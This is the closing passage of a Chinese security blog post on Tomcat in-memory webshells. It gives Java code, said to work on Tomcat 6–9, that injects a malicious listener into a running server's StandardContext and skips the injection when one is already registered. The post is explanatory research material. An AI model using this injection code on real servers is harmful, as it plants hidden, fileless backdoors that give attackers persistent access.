+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getStandardContext();</span><br><span class="line">      <span class="comment">//因为setApplicationEventListeners会清空原本所有的listeners，所以我们先用getApplicationEventListeners取出web程序原本的listeners。</span></span><br><span class="line">      Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class="line">      List&lt;Object&gt; oldlisteners = Arrays.asList(objects);</span><br><span class="line">      List&lt;Object&gt; listeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(oldlisteners);</span><br><span class="line">      listeners.add(<span class="keyword">new</span> <span class="title class_">ListenerTemplate</span>());</span><br><span class="line">      standardContext.setApplicationEventListeners(listeners.toArray());</span><br></pre></td></tr></table></figure>
+
+<p>经测试可以在tomcat6到tomcat9全版本注入我们的恶意listener。</p>
+<p>写我们的内存webshell还有一个小细节，可以看到</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401164722952.png" alt="image-20220401164722952"></p>
+<p><code>requestInitialized</code>拿到的是<code>servletRequestEvent</code>对象，而我们前面filter和servlet可以直接拿到request和response对象。我们看看怎么从<code>servletRequestEvent</code>拿到request和response对象。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220401165156832.png" alt="image-20220401165156832"></p>
+<p>原来根据<code>servletRequestEvent</code>对象可以直接拿到request对象，那没事了。</p>
+<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>为了避免重复注册listener导致服务器出问题，我们还需要判断下之前有没有注入过同名listener，需要找一个能帮助我们判断的属性。</p>
+<p><img src="/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20220406105447966.png" alt="image-20220406105447966"></p>
+<p>可以利用<code>applicationLifecycleListenersObjects</code>属性判断有没有注册过我们的恶意listener，或者用<code>applicationEventListenersList</code>也可以。</p>
+<p>测试tomcat6.x–9.x通过，核心代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getStandardContext();</span><br><span class="line">      <span class="comment">//因为setApplicationEventListeners会清空原本所有的listeners，所以我们先用getApplicationEventListeners取出web程序原本的listeners。</span></span><br><span class="line">      Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class="line">      List&lt;Object&gt; oldlisteners = Arrays.asList(objects);</span><br><span class="line">      List&lt;Object&gt; listeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(oldlisteners);</span><br><span class="line">      <span class="type">Iterator</span> <span class="variable">var0</span> <span class="operator">=</span> oldlisteners.iterator();</span><br><span class="line">      <span class="type">Boolean</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">while</span>(var0.hasNext()) &#123;</span><br><span class="line">          <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> var0.next();</span><br><span class="line">          <span class="keyword">if</span> (var2.getClass().getName().equals(ListenerTemplate.class.getName())) &#123;</span><br><span class="line">              var1 = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(var1==<span class="literal">false</span>)&#123;</span><br><span class="line">          listeners.add(<span class="keyword">new</span> <span class="title class_">ListenerTemplate</span>());</span><br><span class="line">          standardContext.setApplicationEventListeners(listeners.toArray());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/05/04/ssrf%E7%9A%84%E6%B0%B4%E5%A5%BD%E6%B7%B1/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-05-05 23:35:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">tomcat基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96standardContext"><span class="toc-text">获取standardContext</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8request%E5%AF%B9%E8%B1%A1"><span class="toc-text">使用request对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%83%BD%E6%8B%BF%E5%88%B0request%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="toc-text">直接能拿到request对象的场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ContextClassLoader%E8%8E%B7%E5%8F%96request"><span class="toc-text">利用ContextClassLoader获取request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ThreadLocal%E8%8E%B7%E5%8F%96request"><span class="toc-text">利用ThreadLocal获取request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MBean"><span class="toc-text">利用MBean</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BA%BF%E7%A8%8B"><span class="toc-text">利用线程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B-StandardEngine"><span class="toc-text">线程+StandardEngine</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B-Acceptor"><span class="toc-text">线程+Acceptor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Acceptor%E7%BA%BF%E7%A8%8B"><span class="toc-text">Acceptor线程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BD%A9%E8%9B%8B"><span class="toc-text">彩蛋</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="toc-text">Filter创建流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">写入filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%81%E8%A3%85%E6%81%B6%E6%84%8Ffilter%E5%88%B0filterDef"><span class="toc-text">封装恶意filter到filterDef</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FilterMap"><span class="toc-text">FilterMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filterConfig"><span class="toc-text">filterConfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E6%95%B4filter%E5%88%B0%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-text">调整filter到最前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat6%E5%A4%B1%E8%B4%A5%E5%8E%9F%E5%9B%A0"><span class="toc-text">tomcat6失败原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">Tomcat6内存马实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-text">反射</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ClassLoader"><span class="toc-text">ClassLoader</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Servlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Servlet"><span class="toc-text">动态添加Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat6%E4%B8%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">tomcat6下servlet内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Listener内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="toc-text">Listener创建流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">Listener内存马实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Listener"><span class="toc-text">动态添加Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AEListener%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B%E5%AE%9E%E7%8E%B0"><span class="toc-text">根据Listener创建流程实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text">补充</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + tomcat%E5%86%85%E5%AD%98%E9%A9%AC + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F05%2F05%2Ftomcat%25E5%2586%2585%25E5%25AD%2598%25E9%25A9%25AC%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/05/05/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
